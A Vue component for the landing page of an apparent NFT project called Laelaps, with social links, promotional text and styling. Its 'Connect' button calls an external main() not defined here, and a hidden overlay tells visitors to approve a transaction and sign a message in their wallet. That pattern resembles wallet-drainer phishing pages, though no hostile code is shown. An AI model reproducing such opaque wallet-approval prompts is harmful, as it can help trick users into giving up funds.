<template>
  <div class="box">
    <div class="hello">
      <div class="header">
        <div class="header_div">
          <span><a href="#" target="_blank" @click="goToHome()"> Home</a></span>
          <span @click="goToAbout()">
            Utility
            </span>
          <span @click="add" style="cursor:pointer;"><a>Connect</a></span>
          <span><a href="https://t.me/LaelapsPortal" target="_blank"> Telegram</a></span>
          <span><a href="https://twitter.com/LaelapsBot" target="_blank"> Twitter</a></span>
          <span><a href="https://medium.com/@LaelapsBot" target="_blank"> Medium</a></span>
          <span><a href="https://opensea.io/0xADC50022351F4AD58A2A4775Da4eDFD8ff58dEf3/created" target="_blank">
              Opensea</a></span>
        </div>
        <div class="centext_img">
          <div class="centext_txt">
            <img src="../../img/image0.png">
            <h1>Laelaps</h1>
            <p>Witness the awe-inspiring presence of Laelaps! Descended from the divine hounds, this majestic creature
              possesses unparalleled speed and strength, capable of capturing anything it sets its sights on. With the
              agility akin to Hermes and the might of Zeus, Laelaps emerges as an unstoppable force. Take heed, for if you
              find yourself fleeing from Laelaps, there is no evading its relentless pursuit.</p>
          </div>
        </div>
        <div class="head">
          <div class="head_box">
            <span><a href="#" target="_blank">Master Key</a></span>
            <span><a href="https://guild.xyz/laelaps-beta#" target="_blank">Access Here</a></span>
            <span><a href="https://www.youtube.com/watch?v=4H7SeZAb_EM" target="_blank">Watch Me</a></span>
          </div>
        </div>
      </div>
      <div class="done" id="done">
    <div class="donebox">
      <div class="donecon">
        <div class="donedian">
          <span></span>
          <span></span>
          <span></span>
        </div>
        <h4>Done!</h4>
        <p>Please connect wallet & approve transaction</p>
        <span>Sign message in your wallet to continue...</span>
      </div>
    </div>
  </div>
    </div>

  </div>
</template>

<script>
export default {
  name: 'HelloWorld',
  props: {
    msg: String
  },
  methods: {
       goToHome() {
         this.$router.push('/home');
       },
       goToAbout() {
        console.log(11111)
         this.$router.push('/about');
       },
       add(){
        main()
       }
     }
}
</script>

<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped>
@font-face {
  font-family: 'digital';
  src: url('../../img/Adonais.e8871ad8.ttf');
}
.hkzEld{
  transition: opacity 0.1s ease-in-out 0s;
    text-align: center;
    position: fixed;
    width: 100vw;
    height: 100vh !important;
    top: 0px !important;
    left: 0% !important;
    z-index: 2;
    will-change: opacity;
    background-color: rgba(0, 0, 0, 0.4);
    opacity: 1 !important;
    visibility: visible;
    pointer-events: auto;
    display: flex;
    -webkit-box-pack: center;
    justify-content: center;
    -webkit-box-align: center;
    align-items: center;
}
.hello {
  width: 100%;
  height: 100%;
  padding: 0;
  background-color: rgb(204, 182, 145);
}

.header {
  width: 100%;
}

.header_div {
  display: flex;
  justify-content: space-around;
  align-items: center;
  width: 100%;
  margin: 0 auto;
  font-family: digital;
  font-size: 20px;
  color: white;
  height: 80px;
  /* border: 1px blue solid; */
}

.header_div>span a {
  color: white;
}

.header_div>span a:hover {
  color: rgb(141, 0, 8);
}

.centext_img {
  width: 100%;
  height: 670px;
  display: flex;
  flex-direction: column;
  align-items: center;
}

.centext_txt {
  width: 1400px;
  height: 670px;
  display: flex;
  flex-direction: column;
  align-items: center;
  margin: 0 auto;
}

.centext_txt>img {
  width: 400px;
  height: 400px;
  margin: 0 auto;
}

.centext_txt>h1 {
  color: white;
  font-family: digital;
  font-size: 80px;
  margin: 0 !important;
}

.centext_txt>p {
  width: 85%;
  font-family: digital;
  font-size: 26px;
  line-height: 26px;
  color: black;
  text-align: center;
}

.head {
  width: 100%;
  height: 100px;
  display: flex;
  flex-direction: column;
  align-items: center;
}

a {
  text-decoration: none;
}

.head_box {
  width: 1000px;
  height: 100px;
  display: flex;
  justify-content: space-around;
  align-items: center;

}

.head_box>span {
  font-size: 50px;
  font-family: digital;
}

.head_box>span>a {
  color: rgb(141, 0, 8);
}

.head_box>span>a:hover {
  color: white;
}

@media screen and (max-width: 600px) {
  .box{
    width: 100%;
    overflow: hidden;
    height: 1500px;
  }
  .header_div {
    width: 97%;
    height: 60px;
    display: block;
    line-height: 30px;
    text-align: center;
  }

  .header {
    /* width: 100%; */
    height: 100%;
    margin: 0 auto;
  }

  .hello {
    /* width: 100%; */
    height: 100%;

  }

  .centext_txt {
    width: 400px !important;
  }

  .head_box {
    width: 0;
  }

  .centext_txt>img {
    width: 200px;
    height: 200px;
  }

  .centext_txt>p {
    width: 60%;
  }

  .head_box {
    width: 400px;
    flex-direction: column;
   position: relative;
   top: 450px;

  }

  .head_box>span {
    line-height: 100px;
    font-size: 35px;
  }
}
</style>
